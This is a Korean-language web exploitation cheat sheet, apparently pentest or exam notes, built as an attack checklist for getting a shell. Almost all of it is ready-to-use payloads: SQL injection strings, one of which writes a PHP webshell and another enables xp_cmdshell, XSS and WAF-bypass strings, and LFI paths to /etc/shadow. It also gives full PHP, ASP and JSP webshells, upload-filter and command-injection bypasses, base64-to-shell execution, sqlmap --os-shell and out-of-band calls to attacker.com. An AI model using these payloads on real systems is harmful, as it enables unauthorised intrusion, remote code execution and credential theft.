# 🌐 WEB EXPLOITATION CHECKLIST

> **목표: 웹 애플리케이션의 모든 주요 취약점을 체계적으로 테스트하여 쉘 획득 또는 중요 정보 접근**

## ⚡ 기본 페이로드들

### 💉 SQL Injection 기본 테스트

```bash
# GET 파라미터 기본 테스트
'
"
`
')
")
`)
' OR '1'='1
" OR "1"="1
' OR '1'='1'--
' OR '1'='1'#
' OR '1'='1'/*

# POST 파라미터 기본 테스트
username=admin'--&password=anything
username=admin' OR '1'='1'--&password=anything
username=admin' UNION SELECT 1,2,3--&password=anything

# 숫자형 파라미터
1'
1"
1 OR 1=1
1 OR 1=1--
1 OR 1=1#
1; DROP TABLE users--
```

### 🔗 XSS 기본 테스트

```bash
# 기본 XSS 페이로드
<script>alert('XSS')</script>
<script>alert(1)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

# 이벤트 핸들러 기반
<div onmouseover="alert('XSS')">test</div>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>test</option></select>

# JavaScript 문자열 내부
'; alert('XSS'); //
"; alert('XSS'); //
</script><script>alert('XSS')</script>
```

### 📁 LFI/RFI 기본 테스트

```bash
# Linux LFI
../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/version
../../../proc/self/environ
../../../var/log/apache2/access.log

# Windows LFI
../../../windows/system32/drivers/etc/hosts
../../../windows/win.ini
../../../windows/system.ini
../../../boot.ini
C:\windows\system32\drivers\etc\hosts
C:\windows\win.ini

# PHP Wrapper
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### 📤 File Upload 기본 테스트

```bash
# PHP 웹쉘
<?php system($_GET["cmd"]); ?>
<?php echo shell_exec($_GET["cmd"]); ?>
<?php passthru($_GET["cmd"]); ?>
<?php exec($_GET["cmd"], $output); print_r($output); ?>

# ASP 웹쉘
<% eval request("cmd") %>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e){
    Process.Start("cmd.exe","/c " + Request.QueryString["cmd"]);
}
</script>

# JSP 웹쉘
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line + "<br>");
    }
}
%>
```

### 💻 Command Injection 기본 테스트

```bash
# 기본 명령어 구분자
; id
| id
& id
&& id
|| id
` id `
$(id)
${id}

# URL 인코딩
%3B id
%7C id
%26 id
%26%26 id
%7C%7C id

# 시간 기반 테스트
; sleep 5
| sleep 5
& sleep 5
; ping -c 5 127.0.0.1
| ping -c 5 127.0.0.1
```

---

## 🎯 상황별 페이로드

### 🔐 Authentication Bypass

```bash
# SQL Injection 기반 인증 우회
username: admin'--
password: anything

username: admin' OR '1'='1'--
password: anything

username: admin' OR 1=1#
password: anything

username: ' OR ''='
password: ' OR ''='

# NoSQL Injection (MongoDB)
username[$ne]=admin&password[$ne]=password
username[$regex]=.*&password[$regex]=.*
username[$gt]=&password[$gt]=

# JSON 형태
{"username": {"$ne": "admin"}, "password": {"$ne": "password"}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### 📊 Database 특화 SQL Injection

```bash
# MySQL
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,user(),database(),version(),5--
' UNION SELECT 1,2,3,load_file('/etc/passwd'),5--
' UNION SELECT 1,2,3,4,'<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

# MSSQL
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,@@version,db_name(),user_name(),5--
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--

# PostgreSQL
' UNION SELECT 1,2,3,4,5--
' UNION SELECT 1,version(),current_database(),current_user,5--

# Oracle
' UNION SELECT 1,2,3,4,5 FROM dual--
' UNION SELECT 1,banner,3,4,5 FROM v$version--
```

### 🎨 XSS Context별 페이로드

```bash
# HTML Context
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Attribute Context
" onmouseover="alert('XSS')
' onmouseover='alert('XSS')
javascript:alert('XSS')

# JavaScript Context
'; alert('XSS'); //
"; alert('XSS'); //
</script><script>alert('XSS')</script>

# CSS Context
</style><script>alert('XSS')</script>
expression(alert('XSS'))

# URL Context
javascript:alert('XSS')
data:text/html,<script>alert('XSS')</script>
```

### 🔄 File Upload 확장자 우회

```bash
# 이중 확장자
shell.php.jpg
shell.php.png
shell.php.gif
shell.jpg.php
shell.png.php

# 대소문자 변경
shell.PHP
shell.pHp
shell.PhP
shell.ASP
shell.aSp

# Null byte (구형 시스템)
shell.php%00.jpg
shell.php\x00.jpg

# 특수 확장자
shell.phtml
shell.php3
shell.php4
shell.php5
shell.phps
shell.phar
```

---

## 🔄 우회 기법들

### 🛡️ WAF/Filter 우회 기법

```bash
# SQL Injection WAF 우회
# 공백 우회
/**/
%20
%09
%0a
%0b
%0c
%0d
%a0
+

# 키워드 우회
UNION → UnIoN, uNiOn, /**/UNION/**/, UN/**/ION
SELECT → SeLeCt, /**/SELECT/**/, SE/**/LECT
OR → ||, OR/**/, O/**/R
AND → &&, AND/**/, A/**/ND

# 대소문자 섞기
' UnIoN SeLeCt 1,2,3--
' uNiOn sElEcT 1,2,3--

# 주석 활용
'/**/UNION/**/SELECT/**/1,2,3--
'/*!UNION*//*!SELECT*/1,2,3--

# 함수 우회
substring → substr, mid
ascii → ord
length → len, char_length
```

### 🎭 XSS Filter 우회

```bash
# 태그 우회
<script> → <ScRiPt>, <SCRIPT>, <scr<script>ipt>
<img> → <IMG>, <ImG>, <i<img>mg>

# 이벤트 핸들러 우회
onload → OnLoAd, ONLOAD, on/**/load
onerror → OnErRoR, ONERROR, on/**/error

# JavaScript 우회
alert → top['alert'], window['alert'], eval('alert')
alert('XSS') → alert(String.fromCharCode(88,83,83))

# 인코딩 우회
<script>alert('XSS')</script>
%3Cscript%3Ealert('XSS')%3C/script%3E
&#60;script&#62;alert('XSS')&#60;/script&#62;
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 🔓 File Upload Filter 우회

```bash
# MIME Type 우회
Content-Type: image/jpeg (웹쉘 파일에)
Content-Type: image/png
Content-Type: image/gif

# Magic Bytes 추가
GIF89a<?php system($_GET["cmd"]); ?>
\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>  # JPEG
\x89PNG<?php system($_GET["cmd"]); ?>           # PNG

# .htaccess 업로드 (Apache)
AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif

# 파일명 우회
../../../var/www/html/shell.php
shell.php.
shell.php%20
shell.php%0a
```

### 💾 Command Injection 우회

```bash
# 공백 우회
{cmd}
${IFS}cmd
$IFS$9cmd
cmd$IFS$9
%20cmd
%09cmd

# 키워드 우회
cat → c''at, c""at, c\at, \c\a\t
id → i\d, 'i'd, "i"d
whoami → w'h'o'a'm'i, w"h"o"a"m"i

# 변수 활용
a=i;b=d;$a$b
cmd=id;$cmd
c='cat /etc/passwd';$c

# Base64 인코딩
echo 'aWQ=' | base64 -d | sh
echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
```

---

## 🤖 자동화 도구 명령어

### 🔍 SQLMap

```bash
# 기본 스캔
sqlmap -u "http://{IP}/page.php?id=1" --dbs
sqlmap -u "http://{IP}/page.php?id=1" --current-db
sqlmap -u "http://{IP}/page.php?id=1" --tables
sqlmap -u "http://{IP}/page.php?id=1" -D database --dump

# POST 데이터 스캔
sqlmap -u "http://{IP}/login.php" --data="username=admin&password=admin" --dbs

# 쿠키 포함
sqlmap -u "http://{IP}/page.php?id=1" --cookie="PHPSESSID=abc123" --dbs

# Request 파일 사용
sqlmap -r request.txt --dbs

# OS 쉘 획득
sqlmap -u "http://{IP}/page.php?id=1" --os-shell

# 파일 읽기/쓰기
sqlmap -u "http://{IP}/page.php?id=1" --file-read="/etc/passwd"
sqlmap -u "http://{IP}/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### 🌐 Burp Suite 명령어

```bash
# Intruder 공격 타입
# Sniper: 하나의 페이로드 세트로 순차 공격
# Battering ram: 모든 위치에 동일한 페이로드
# Pitchfork: 여러 페이로드 세트를 순서대로 매칭
# Cluster bomb: 모든 페이로드 조합 테스트

# Repeater 단축키
Ctrl+R: Send to Repeater
Ctrl+Space: Send request
Ctrl+Shift+B: Base64 encode/decode
Ctrl+Shift+H: HTML encode/decode
Ctrl+Shift+U: URL encode/decode
```

### 🎯 OWASP ZAP

```bash
# 명령줄에서 ZAP 실행
zap.sh -daemon -port 8080 -config api.disablekey=true

# Spider 스캔
curl "http://localhost:8080/JSON/spider/action/scan/?url=http://{IP}"

# Active 스캔
curl "http://localhost:8080/JSON/ascan/action/scan/?url=http://{IP}"

# 결과 확인
curl "http://localhost:8080/JSON/core/view/alerts/"
```

### 🔧 기타 자동화 도구

```bash
# Nikto
nikto -h http://{IP} -o nikto_output.txt

# Wapiti
wapiti -u http://{IP} -o wapiti_report

# XSSer
xsser -u "http://{IP}/search.php?q=XSS" --auto

# Commix (Command Injection)
commix -u "http://{IP}/ping.php?ip=127.0.0.1"

# dotdotpwn (Directory Traversal)
dotdotpwn -m http -h {IP} -x 8080 -f /etc/passwd
```

---

## 🚨 문제 해결

### 🔒 403 Forbidden 많이 나올 때

```bash
# User-Agent 변경
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" http://{IP}/admin/

# Referer 헤더 추가
curl -H "Referer: http://{IP}/" http://{IP}/admin/

# X-Forwarded-For 헤더 추가
curl -H "X-Forwarded-For: 127.0.0.1" http://{IP}/admin/
curl -H "X-Originating-IP: 127.0.0.1" http://{IP}/admin/
curl -H "X-Real-IP: 127.0.0.1" http://{IP}/admin/

# HTTP 메소드 변경
curl -X POST http://{IP}/admin/
curl -X PUT http://{IP}/admin/
curl -X OPTIONS http://{IP}/admin/
```

### 🛡️ WAF 탐지시

```bash
# 요청 지연
sleep 2 && curl http://{IP}/attack

# 프록시 체인 사용
proxychains curl http://{IP}/attack

# 페이로드 분할
# SQL injection을 여러 요청으로 분할
curl "http://{IP}/page.php?id=1/*"
curl "http://{IP}/page.php?id=*/UNION/*"
curl "http://{IP}/page.php?id=*/SELECT/*"

# 다른 파라미터에 노이즈 추가
curl "http://{IP}/page.php?id=1' UNION SELECT 1,2,3--&noise=random_data"
```

### 🚫 필터링 강할 때

```bash
# 대체 인코딩 방법
# URL encoding: %20, %27, %22
# HTML encoding: &#32;, &#39;, &#34;
# Unicode encoding: \u0020, \u0027, \u0022

# 다양한 주석 스타일
-- (SQL)
# (MySQL)
/* */ (SQL)
// (JavaScript)
<!-- --> (HTML)

# 키워드 분할
# UNION → UN/**/ION
# SELECT → SEL/**/ECT
# script → scr<script>ipt
```

### 🔍 페이로드 응답이 없을 때

```bash
# 시간 기반 테스트
# SQL: SLEEP(), WAITFOR DELAY
# Command: sleep, ping
# 응답 시간 차이로 취약점 확인

# 에러 기반 테스트
# SQL: 의도적으로 에러 발생시켜 정보 수집
# XSS: console.log() 사용으로 브라우저 콘솔 확인

# Out-of-band 테스트
# DNS 요청: nslookup attacker.com
# HTTP 요청: curl http://attacker.com/
```

### 📱 모바일/AJAX 애플리케이션

```bash
# API 엔드포인트 테스트
curl -X POST -H "Content-Type: application/json" -d '{"param":"value"}' http://{IP}/api/endpoint

# CSRF 토큰 무시
curl -X POST --data "csrf_token=invalid&param=value" http://{IP}/action

# JSON 페이로드
curl -X POST -H "Content-Type: application/json" -d '{"id":"1 OR 1=1"}' http://{IP}/api/user

# XML 페이로드 (XXE)
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>' http://{IP}/api/xml
```

---

## 📋 웹 공격 우선순위 체크리스트

### 🔥 High Priority (즉시 쉘 획득 가능)

- [ ] **File Upload** → 웹쉘 업로드 → 즉시 RCE
- [ ] **Command Injection** → 직접 시스템 명령 실행
- [ ] **SQL Injection (FILE 권한)** → 웹쉘 파일 쓰기
- [ ] **LFI + Log Poisoning** → 로그 파일을 통한 코드 실행

### 🟡 Medium Priority (정보 수집 → 쉘 획득)

- [ ] **SQL Injection** → 데이터베이스 정보 → 크레덴셜 수집
- [ ] **LFI** → 시스템 파일 읽기 → SSH 키, 설정 파일
- [ ] **Directory Traversal** → 중요 파일 접근
- [ ] **Authentication Bypass** → 관리자 기능 접근

### 🟢 Low Priority (정보 수집)

- [ ] **XSS** → 세션 하이재킹, 정보 수집
- [ ] **CSRF** → 권한 있는 작업 수행
- [ ] **Information Disclosure** → 시스템 정보 노출

---

## ⏱️ 시간 관리 가이드

### 🎯 각 취약점별 테스트 시간

- **File Upload**: 10-15분 (높은 성공 가능성)
- **SQL Injection**: 15-20분 (데이터베이스 접근)
- **Command Injection**: 10-15분 (즉시 RCE)
- **LFI/Directory Traversal**: 10-15분 (파일 접근)
- **XSS**: 5-10분 (정보 수집 목적)

### 💥 성공 기준

**즉시 다음 단계로:**

- [ ] 웹쉘 업로드 성공 → `SHELLS/reverse-shells.md`
- [ ] 시스템 명령 실행 성공 → 리버스쉘 시도
- [ ] 데이터베이스 접근 성공 → 중요 정보 수집
- [ ] 중요 파일 읽기 성공 → SSH 키, 크레덴셜 확인

**다음 단계**: 성공한 취약점에 따라 적절한 후속 공격 또는 권한 상승 시도
